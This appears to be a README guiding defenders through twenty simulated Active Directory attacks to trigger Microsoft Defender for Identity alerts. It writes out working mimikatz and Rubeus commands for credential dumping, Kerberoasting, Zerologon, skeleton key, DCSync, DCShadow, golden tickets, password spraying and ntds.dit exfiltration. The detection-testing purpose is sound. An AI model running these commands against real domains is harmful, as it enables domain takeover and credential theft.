# Attack simulations for Microsoft Defender for Identity (MDI)

---
Author: Daniel Pasquier

## Introduction

As you know, MDI is a powerful solution to detect abnormal or suspicious activities from managed or unmanaged or even unknown machines targeting Domain Controllers. 
When running a lab or a pentesting ensure your MDI configuration is well configured and ready, especially with the machine learning period; please see linked-In article: https://www.linkedin.com/pulse/how-fully-evaluate-microsoft-defender-identity-mdi-pasquier-ceh/.

Keep in mind that tools used below are just sample ones and do not use hacking third party tools with production accounts.

Then from a new machine (fresh install, managed or unmanaged) try the following scenarios:

# 1 – Network mapping reconnaissance (DNS)   
This reconnaissance is used by attackers to map your network structure and target interesting computers for later steps in their attack.

There are several query types in the DNS protocol. This Defender for Identity security alert detects suspicious requests, either requests using an AXFR (transfer) originating from non-DNS servers, or those using an excessive number of requests.

From a command line on a workstation run :  
~~~  
Nslookup  
server MSDemoInfra-DC1.msdemo.local  
ls -d msdemo.local   
~~~
  
Detail in the alert:  
    
<img width="890" alt="DNS1c" src="https://github.com/DanielpFR/MDI/assets/95940022/b77503b7-7ba0-4a61-9dfd-48e0054b641a">
        
If you want to see DNS activities from this IP (if Microsoft Defender for Endpoint is not present on the source computer) :  
  
<img width="1200" alt="DNS2" src="https://github.com/DanielpFR/MDI/assets/95940022/2831452e-0f2a-4107-a633-635740207daf">  
  
  
# 2 - User and IP address reconnaissance  
In this detection, an alert is triggered when an SMB session enumeration is performed against a domain controller; users and computers need at least to access the sysvol share in order to retreive GPOs. Attacker can use this information to know where users recently logged on and move laterally in the network to get to a specific sensitive account.  

From a command line on a workstation run :    
~~~  
NetSess.exe MSDemoInfra-DC1.msdemo.local  
~~~  
Tools availbale from : http://www.joeware.net/freetools/tools/netsess/  

You should see activity and the alert in the user timeline :  

<img width="1200" alt="Reco2" src="https://github.com/DanielpFR/MDI/assets/95940022/7d8e4d72-661e-4759-891a-9fee374a45ee">


Detail in the alert:  
  
<img width="1200" alt="Reco1" src="https://github.com/DanielpFR/MDI/assets/95940022/e435ba2f-5a33-4f69-b937-90a3743f15ea">

  

# 3 - User and group membership reconnaissance (SAMR)  
In this detection, User and group membership reconnaissance are used by attackers to map the directory structure and target privileged accounts for later steps in their attack using SAMR protocol.

From a command line on a workstation with proper permissions, run:  

~~~  
net user /domain   
net group /domain  
net group "Domain Admins" /domain  
net group "Enterprise Admins" /domain  
net group "Schema Admins" /domain  
~~~

You should see activity and the alert in the user timeline :  

<img width="1200" alt="Samr1" src="https://github.com/DanielpFR/MDI/assets/95940022/49237748-dbec-4b97-aae4-f10b1ec3f227">

Detail in the alert:  

<img width="1200" alt="Samr2" src="https://github.com/DanielpFR/MDI/assets/95940022/553d0e18-f12a-4318-b1bb-14b7e2c09be0">


# 4 - Security principal reconnaissance (LDAP)  
In this detection, MDI looks for LDAP security principal reconnaissance which is commonly used as the first phase of a Kerberoasting attack. Kerberoasting attacks are used to get a target list of Security Principal Names (SPNs), which attackers then attempt to get Ticket Granting Server (TGS) tickets for.

From a command line on a workstation with proper permissions, run the tools from the French Security Agency (https://www.linkedin.com/company/anssi-fr/) for data collection:   

~~~  
Oradad.exe  
~~~
  
Tools available from : https://github.com/ANSSI-FR/ORADAD/releases 
  
You should see the activities and the alert in the user timeline :  
    
<img width="1200" alt="4LDAP1" src="https://github.com/DanielpFR/MDI/assets/95940022/b9ad4117-bfb1-4ea9-999e-70ab6a166d7a">
  
Detail in the alert with all settings in the ldap search filter :  
  
<img width="1200" alt="4LDAP2" src="https://github.com/DanielpFR/MDI/assets/95940022/eb3a221f-16ca-4f5b-b14d-46681fd34e1d">

with the enumeration types :
  
<img width="500" alt="4LDAP3" src="https://github.com/DanielpFR/MDI/assets/95940022/4df70911-ae90-4cf0-8269-edd1c8e98496">

  
# 5 - Honey Token activity  
This lure account should be attractive for attackers (attractive name or sensitive group memebership..) and be left unused by your organisation; any activity from them might indicate malicious behavior (LDAP, NTLM or Kerberos logon attempts).

From MSTSC.exe or from an interactive logon, try to logon using this account with a wrong password and/or valid password :  

You should see the logon activity and the alert in the Honey Token user timeline :  

<img width="1200" alt="5Honey1" src="https://github.com/DanielpFR/MDI/assets/95940022/07ccfc84-29cd-40a1-8788-7cf8579c2acf">  
  
Detail in the alert (failed logon attempt on ldap and NTLM):  
  
<img width="889" alt="5Honey2" src="https://github.com/DanielpFR/MDI/assets/95940022/8ddd20b3-8595-4591-87c5-7a6ac017c5c0">

  
# 6 - Active Directory attributes reconnaissance (LDAP)  
Active Directory LDAP attributes reconnaissance is used by attackers to gain critical information about the domain environment, such as accounts with DES or RC4 kerberos cipher, accounts with Kerberos Pre-Authentication disabled and service account configured woth Uncosntrainted Keberos Delegation.

On a workstation, with adsisearcher (PowerShell) or any ldap browser such as ldp.exe set the following ldap filters,

Enumerate accounts with Kerberos DES enabled :  
~~~ 
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2097152)) FindAll()  
~~~
Enumerate accounts with Kerberos Pre-Authentication disabled :  
~~~ 
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) FindAll()  
~~~
Enumerate all servers configured for Unconstrained kerberos Delegation (Excluding DCs) :  
~~~ 
(&(objectCategory=computer)(!(primaryGroupID=516)(userAccountControl:1.2.840.113556.1.4.803:=524288))) FindAll()  
~~~
Enumerate all service accounts configured with Unconstrained kerberos Delegation :  
~~~ 
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288)) FindAll()
~~~ 
Enumerate all enabled accounts :  
~~~ 
(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) FindAll()  
~~~
Enumerate all users with password stored in reversible encryption :  
~~~ 
(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128)) FindAll()   
~~~ 
    
Detail in the alert :  

<img width="1200" alt="6LDAP2" src="https://github.com/DanielpFR/MDI/assets/95940022/750ab5e9-4653-4c33-83fd-29658b3574c7">  

with with all settings in the ldap search filter for each request :  
  
<img width="500" alt="6LDAP3" src="https://github.com/DanielpFR/MDI/assets/95940022/f59017a5-aabd-4852-8bf7-c2ef42dc3a60">
  

# 7 - Account enumeration Reconnaissance  
In this alert, Attacker makes Kerberos requests using a list of names to try to find a valid username in the domain; If a guess successfully determines a username, the attacker gets the WrongPassword (0xc000006a) instead of NoSuchUser (0xc0000064) NTLM error.

Build a users.txt list of names by merging some names from https://github.com/jeanphorn/wordlist/blob/master/usernames.txt and add some valid name from your organisation.

Then, run the following command from a PowerShell session on a workstation :  

~~~
Import-Module .\adlogin.ps1  
adlogin users.txt msdemo.local
~~~

Tools available from : https://github.com/jeanphorn/wordlist & https://github.com/InfosecMatter/Minimalistic-offensive-security-tools

You also see the activities from this machine with a simple Advanced Hunting query (KQL) :  

<img width="1200" alt="8Enu1" src="https://github.com/DanielpFR/MDI/assets/95940022/25df6e3d-dcc3-4829-ae0a-86144520e052">  

Detail in the alert:  

<img width="1200" alt="8Enum2" src="https://github.com/DanielpFR/MDI/assets/95940022/af72006c-08e9-4623-8c81-0f073d08fec0">  


# 8 - Suspected Kerberos SPN exposure  

For details about this alert, see [Suspected AS-REP Roasting attack (external ID 2412)](compromised-credentials-alerts.md#suspected-as-rep-roasting-attack-external-id-2412).

In this detection, MDI looks for Attackers that enumerate service accounts and their respective SPNs (Service principal names), request a Kerberos service ticket for the services, capture the Ticket Granting Service (TGS) tickets from memory and extract their hashes, and save them for later use in an offline brute force attack.  

From a comand line on a workstation run:  

~~~
Rubeus.exe kerberoast  
Rubeus.exe kerberoast /tgtdeleg  
Rubeus.exe asktgs /service:http/msdemo-CM01.msdemo.local /ptt  
~~~

Tools available from : https://github.com/GhostPack/Rubeus or https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/tree/master/dotnet%20v4.5%20compiled%20binaries

Detail in the alert:  

<img width="1200" alt="9Kerberosating2" src="https://github.com/DanielpFR/MDI/assets/95940022/77c4641a-072e-4d8b-b2b5-cc8ffcaa1c85">  

and the detail of the ldap search filter:  

<img width="500" alt="9Kerberosating3" src="https://github.com/DanielpFR/MDI/assets/95940022/df64a087-01fe-4540-8d2b-8fa4328d6cbb">  

  
# 9 - Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack
In this detection, an alert is triggered when many authentication failures occur using Kerberos, NTLM, or use of a password spray is detected. Using Kerberos or NTLM, this type of attack is typically committed either horizontal, using a small set of passwords across many users, vertical with a large set of passwords on a few users, or any combination of the two.

From a command line on a workstation, run :

*net user /domain >users.txt* => to retrieve the list of users in your domain and the result needs to be in one columm

From a PowerShell command line on a workstation, run:  

*Import-Module .\adlogin.ps1*  
*adlogin users.txt msdemo.local P@ssw0rd* => for a password spray attack by using one carefully crafted password against all of the known user accounts (one password to many accounts)

You should see the activities and the alert in the client machine timeline :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image17.png)  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image18.png)  

For a brute force attack just try to logon on few accounts with multiple passwords...

You should see the activities and the alert in the client machine timeline :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image19.png)  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image20.png)  

# 10 - Suspected identity theft (pass-the-ticket) & (pass-the-hash)
Pass-the-Ticket or Pass-The-Hash is a lateral movement technique in which attackers steal a Kerberos ticket or user's NTLM hash from one computer and use it to gain access to another computer by reusing the stolen ticket or user's NTLM hash.  
This detection is often miss-understanding; if you perform a Pass-The-Ticket from one security context to another security context on the same machine, you will not generate an MDI alert, this activity can only be seen with an EDR on a managed machine.  
What MDI can detect, without any client agent and even if the activity is seen from an unmanaged machine (without EPP or EDR), is one Kerberos ticket (TGT) was issued to a user on a specific machine (Name, IP) and the same ticket is seen coming from another machine (Name, IP), so MDI can trigger a Suspected identity theft… 
In this detection a Kerberos ticket is seen used on two (or more) different computers.  

On the machine 1 (ADMIN-PC) where a domain user is in used (logon as Task, Service, RDP, Interactive..), from a command line run as local admin :

*mimikatz # privilege::debug*  
*mimikatz # sekurlsa::logonpasswords*  
*mimikatz # sekurlsa::tickets /export* => rename the Nuck's TGT file (or whatever) to nuck.kirbi

On the machine 2 (VICTIM-PC), from a command line run as local admin :

*mimikatz # privilege::debug*  
*mimikatz # kerberos::ptt nuck.kirbi*  
*mimikatz # Quit*  
*Klist* => check if the TGT for nuck is loaded  
Perfrom an ldap bind (digest) using for example LDP.exe => the stolen TGT from machine 1 will be presented to a DC to issue a TGS for the ldap query

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
  
Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image21.png)  
 
# 11 - Malicious request of Data Protection API (DPAPI) master key
DPAPI is used by Windows to securely protect passwords saved by browsers, encrypted files, Certificate’s private key, and other sensitive data. DCs hold a backup master key (RSA 2048) that can be used to decrypt all secrets encrypted with DPAPI on domain-joined Windows machines.  
This is needed when a user password is reset, the blob with sensitive data cannot be decrypted with the new password so a DC must retrieve the data using the master key.  
Attackers can use the master key to decrypt any secrets protected by DPAPI on all domain-joined machines. In this detection, a MDI alert is triggered when the DPAPI is used to retrieve the backup master key.  

From a command line on workstation run with and admin account :  
  
*mimikatz # privilege::debug*  
*mimikatz # lsadump::backupkeys /system:msdemo-DC01 /export*  

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

You should see the activities and the alert in the user timeline :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image22.png)  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image23.png)  

# 12 - Suspected skeleton key attack (encryption downgrade)
Skeleton Key is malware that runs on domain controllers and allows authentication to the domain with any account without knowing its password. This malware often uses weaker encryption algorithms to hash the user's passwords on the domain controller.  
It means the attacker can use the same password for any AD accounts without the need to reset or change the orginal accounts's password.  
In this alert, the learned behavior of previous KRB_ERR message encryption from domain controller to the account requesting a ticket, was downgraded.

**Be careful, never run an untrusted tools on a prodcution DC! Once the DC is impacted, there is no easy rollback, the DC has to be depromoted!**  

From a command line on a workstation with a shell on DC, run as AD admin :

*mimikatz # privilege::debug*  
*mimikatz # misc::skeleton*  => "mimikatz" should be the master password  

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image24.png)  

# 13 - Suspected Neltogon privilege elevation attempt (CVE-2020-1472 exploitation)  
The alert is triggered if an attacker attempts to establish a vulnerable Netlogon secure channel connection to a DC, using the Netlogon Remote Protocol (MS-NRPC), also known as Netlogon Elevation of Privilege Vulnerability.

From a command line on a workstation run with a local admin account: 

*mimikatz # privilege::debug*  
*mimikatz # lsadump::zerologon /server:msdemo-DC01.msdemo.local /account:msdemo-DC01$ /exploit*  
# 
Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image25.png)  

# 14 - Suspicious network connection over Encrypting File System Remote Protocol
This detection is triggered when an attacker tries to take over an AD Domain by exploiting a flaw in the Encrypting File System Remote (EFSRPC) Protocol.

From a command line on a workstation run with a local admin account:  

*mimikatz # privilege::debug*  
*mimikatz # misc::efs /server:10.4.0.100 /connect:10.4.0.13 /noauth*  

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image26.png)

# 15 - Suspected DCSync attack (replication of directory services)
If an attacker has the "DS-Replication-Get-Changes-All" permission for example, he can initiate a replication request to retrieve the data stored in Active Directory such as the krbtgt's password hash.  
In this detection, an alert is triggered when a replication request is initiated from a computer that isn't a DC.  

From a command line on a workstation run with a least local admin account :  

*mimikatz # privilege::debug*  
*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to retrieve the krbtgt's password hash and move to a golden ticket attack

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

You should see the activities and the alert in the client machine timeline :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image27.png)  

In the alert Compay Segundo failed to retrieve the DCsync (not enough permission):  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image28.png)  

# 16 - Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)
Two alerts are available but let's focus only on the "Domain controller replication request" alert; in this scenario, attackers strive to initiate a malicious replication request, allowing them to change Active Directory objects on a genuine DC, which can give the attackers persistence in the domain.

From a command line on a workstation run with AD admin account :  

*mimikatz # privilege::debug*  
*mimikatz # lsadump::dcshadow /object:krbtgt /attribute=ntPwdHistory /value:0000000000*  
*mimikatz # lsadump::dcshadow /push*  

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

Detail in the alert :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image29.png)  

# 17 - Remote code execution attempts  
MDI detects PSexec, Remote WMI, and PowerShell connections from a client machine to a DC. Attackers can execute remote commands on your DC or AD FS server to create persistence, collect cata or perform a denial of service (DOS).

From a command line on a workstation run with AD admin account :  

*PSExec.exe -s -i \\msdemo-dc01 powershell.exe*  => to start a PowerShell session on DC

Tools available from : https://docs.microsoft.com/en-us/sysinternals/downloads/

Detail in the alert :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image30.png) 

# 18 - Data exfiltration over SMB
This alert is triggered when suspicious transfers of data are observed from your monitored DCs, such as when an attacker copies the ntds.dit file from a DC to a workstation.

From a command line on a workstation run with AD admin account :  
*PSEexec -s -i \\msdemo-DC01 cmd.exe* => to get a cmd session on a DC  
*Esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit* => to get a copy of the ntds.dit file for an exfiltration  
*copy c:ntds.dit to z:* => copy the ntds.dit file from the DC to your workstation (Z:)  

Tools available from : https://docs.microsoft.com/en-us/sysinternals/downloads/  

Detail in the alert :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image31.png) 

Keep in mind that MDI can also track files uploaded from workstation or server to a DC; this can be useful to detect abnormal activities (see https://github.com/DanielpFR/MDI/#tips-3--list-of-files-copied-from-a-client-to-dcs-over-the-last-30-days). You should see this type of activities from the user timeline :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image32.png)  

# 19 - Suspected Golden Ticket usage (encryption downgrade) & (nonexistent account) & (Time anomaly) etc..
MDI can detect 6 types of Golden Ticket attack; let see 2 of them.  
Using the krbtgt's password hash from the DCsync; attackers can now create a Kerberos ticket granting ticket (TGT) that provides authorization to any resource and set the ticket expiration to any arbitrary time. This fake TGT is called a "Golden Ticket" and allows attackers to achieve network persistence.  

From a command line on a workstation, run with local admin account:  

*mimikatz # privilege::debug*  
*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to get the krbgt's password hash needed for the /rc4:...  
*mimikatz # Kerberos::golden /domain:msdemo.local /sid:S-1-5-21-4112553867-xxxxxxxxxxxx /rc4:xxxxxxxxxxxxxxx /user:administrator /id:500 /groups:513,512,520,518,519 /ticket:administrator.kirbi* => create a fake TGT for the default administrator account (RID=500) and add sensitives RID groups  
*mimikatz # kerberos::ptt administrator.kirbi* => load the fake TGT  
*mimikatz #	misc::cmd* => open a cmd  
*klist* => check if the TGT is loaded  
*ldp.exe* => then bind (digest) to an ldap server to use the fake TGT for encryption downgrade detection

*mimikatz # privilege::debug* 
*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to get the krbgt's password hash needed for the /rc4:...  
*mimikatz # Kerberos::golden /domain:msdemo.local /sid:S-1-5-21-4112553867-xxxxxxxxxxxx /rc4:xxxxxxxxxxxxxxx /user:XYZ /id:500 /groups:513,512,520,518,519,1107 /ticket:XYZ.kirbi => create a fake TGT for the nonexistent account and add sensitives RID groups (valid for 2àmn)
*mimikatz # kerberos::ptt XYZ.kirbi* => load the fake TGT  
*klist* => check if the TGT is loaded  
*ldp.exe* => then bind (digest) to an ldap server to use the fake TGT for nonexistent account detection  

Tools available from : https://github.com/gentilkiwi/mimikatz/releases  

Detail in the alert :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image35.png)  
![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image36.png)  

# 20 - Suspicious additions to sensitive groups
Attackers could add users to highly privileged groups to gain access to more resources, and gain persistency. This alert needs a machine learning period (such as : this user usually does not perform this addition to sensitive groups...etc).

From a workstation with RSAT start with an AD admin account:  

*dsa.msc*  => and add a user to a sensitive groups such as Enterprise Admins or Domain Admins  

Tools available from : https://www.microsoft.com/en-us/download/details.aspx?id=45520  

You should see the activities and the alert in the user timeline :  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image33.png)  

Detail in the alert:  

![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image34a.png)  


















